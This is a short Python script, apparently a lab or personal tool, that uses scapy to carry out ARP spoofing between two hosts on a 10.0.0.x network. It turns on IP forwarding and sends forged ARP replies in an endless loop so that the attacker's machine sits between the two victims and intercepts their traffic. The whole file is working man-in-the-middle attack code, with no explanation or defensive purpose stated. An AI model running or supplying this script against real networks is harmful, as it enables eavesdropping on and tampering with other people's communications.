from scapy.all import *
import os
import sys

# Initialisation of MAC and IP Adresses
v1_mac = '08:00:27:5b:5b:32'
v1_ip = '10.0.0.1'
v2_mac = '08:00:27:6c:e3:94'
v2_ip = '10.0.0.2'
a_mac = '08:00:27:16:c7:7e'
a_ip = '10.0.0.3'

#Activation of IP Forwarding
os.system("sysctl -w net.ipv4.ip_forward=1")
print("[+] Activation IP Forwarding")

# Initialisation of ARP Packets
p1 = Ether()/ARP()
p1.hwsrc = a_mac
p1.psrc = v2_ip
p1.dst = v1_mac

p2 = Ether()/ARP()
p2.hwsrc = a_mac
p2.psrc = v1_ip
p2.dst = v2_mac

# Send ARP Packets to infinity every 0.2 seconds
print("[+] ARP packets sent to infinity")
sendp([p1, p2], iface='eth1', loop=1, inter=0.2)

# Deactivation of IP Forwarding
os.system("sysctl -w net.ipv4.ip_forward=0")
print("[+] Deactivation IP Forwarding")
